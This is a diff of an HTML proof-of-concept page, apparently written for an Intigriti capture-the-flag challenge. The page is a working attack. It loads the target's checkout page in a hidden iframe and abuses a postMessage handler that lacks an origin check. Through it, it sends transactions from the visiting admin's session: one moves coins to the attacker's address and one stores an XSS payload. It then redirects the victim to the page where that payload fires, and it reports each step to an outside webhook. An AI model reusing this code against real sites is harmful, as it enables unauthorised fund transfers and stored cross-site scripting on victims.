@@ -2,51 +2,53 @@
 <html>
 <head><title>PoC</title></head>
 <body>
+<iframe id="f" style="display:none"></iframe>
 <script>
-async function pwn() {
-  const BASE = 'https://challenge-0126.intigriti.io';
-  const WEBHOOK = 'https://webhook.site/bcf23067-6898-4c8d-9741-26589bcc4876';
-  const YOUR_ADDRESS = '1cc4a7735c998cb4b4e390e97c349281d2';
-  const XSS_PAYLOAD = `<img src=x onerror="alert('gigawatz')">`;
+const BASE = 'https://challenge-0126.intigriti.io';
+const WEBHOOK = 'https://webhook.site/bcf23067-6898-4c8d-9741-26589bcc4876';
+const YOUR_ADDRESS = '1cc4a7735c998cb4b4e390e97c349281d2';
+const XSS_PAYLOAD = `<img src=x onerror="alert('gigawatz')">`;
 
-  // Track: Admin visited PoC
-  fetch(`${WEBHOOK}/?step=started`);
+const f = document.getElementById('f');
 
-  try {
-    // Transaction 1: Send 2 1337COIN to YOUR address (you get coins, can see flag)
-    const tx1 = await fetch(`${BASE}/api/transaction`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      credentials: 'include',
-      body: JSON.stringify({
-        toAddress: YOUR_ADDRESS,
-        currency: '1337COIN',
-        amount: 2
-      })
-    });
-    fetch(`${WEBHOOK}/?step=tx1_status_${tx1.status}`);
+f.onload = () => {
+  fetch(`${WEBHOOK}/?step=iframe_loaded`);
 
-    // Transaction 2: Send 2 1337COIN to XSS payload (shows in marketwatch, triggers alert)
-    const tx2 = await fetch(`${BASE}/api/transaction`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      credentials: 'include',
-      body: JSON.stringify({
+  // Transaction 1: Send 2 1337COIN to YOUR address
+  f.contentWindow.postMessage({
+    type: 'submitTransaction',
+    transaction: {
+      toAddress: YOUR_ADDRESS,
+      currency: '1337COIN',
+      amount: 2
+    }
+  }, '*');
+
+  // Wait, then Transaction 2: Send 2 1337COIN to XSS payload
+  setTimeout(() => {
+    f.contentWindow.postMessage({
+      type: 'submitTransaction',
+      transaction: {
         toAddress: XSS_PAYLOAD,
         currency: '1337COIN',
         amount: 2
-      })
-    });
-    fetch(`${WEBHOOK}/?step=tx2_status_${tx2.status}`);
+      }
+    }, '*');
+    fetch(`${WEBHOOK}/?step=both_tx_sent`);
 
-    // Redirect to marketwatch to trigger XSS
-    fetch(`${WEBHOOK}/?step=redirecting`);
-    window.location = `${BASE}/marketwatch.html`;
-  } catch (e) {
-    fetch(`${WEBHOOK}/?error=${encodeURIComponent(e.message)}`);
-  }
-}
-pwn();
+    // Redirect to marketwatch after transactions
+    setTimeout(() => {
+      fetch(`${WEBHOOK}/?step=redirecting`);
+      window.location = `${BASE}/marketwatch.html`;
+    }, 1000);
+  }, 500);
+};
+
+// Track: Admin visited PoC
+fetch(`${WEBHOOK}/?step=started`);
+
+// Open checkout.html in iframe (has postMessage vuln, no origin check)
+f.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
 </script>
 </body>
 </html>
